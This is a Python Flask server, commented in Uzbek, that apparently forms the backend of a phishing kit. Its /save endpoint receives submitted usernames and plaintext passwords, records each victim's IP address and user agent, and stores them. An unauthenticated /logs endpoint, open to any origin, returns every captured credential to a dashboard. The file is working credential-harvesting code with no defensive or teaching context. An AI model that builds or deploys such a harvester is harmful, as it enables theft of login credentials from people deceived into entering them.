from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import database
import os

app = Flask(__name__, static_folder='../frontend', static_url_path='')
CORS(app, resources={r"/*": {"origins": "*"}})
database.init_db()

# Barcha route'lar uchun CORS headers
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

# Frontend fayllarini uzatish
@app.route('/')
def index():
    return send_from_directory(app.static_folder, 'index.html')

@app.route('/dashboard')
def dashboard():
    return send_from_directory(app.static_folder, 'dashboard.html')

@app.route('/<path:filename>')
def serve_static(filename):
    return send_from_directory(app.static_folder, filename)

# API endpoints
@app.route('/save', methods=['POST', 'OPTIONS'])
def save():
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.json
        username = data.get('username', '')
        password = data.get('password', '')
        user_agent = data.get('userAgent', request.headers.get('User-Agent', ''))
        ip_address = request.remote_addr

        database.save_log(username, password, user_agent, ip_address)
        return jsonify({'status': 'success', 'message': 'Saved'}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/logs', methods=['GET', 'OPTIONS'])
def logs():
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        logs_data = database.get_logs()
        total, today, last = database.get_stats()

        logs_list = []
        for log in logs_data:
            logs_list.append({
                'id': log[0],
                'username': log[1],
                'password': log[2],
                'timestamp': log[3],
                'user_agent': log[4],
                'ip_address': log[5]
            })

        return jsonify({
            'status': 'success',
            'total': total,
            'today': today,
            'last': last,
            'logs': logs_list
        }), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)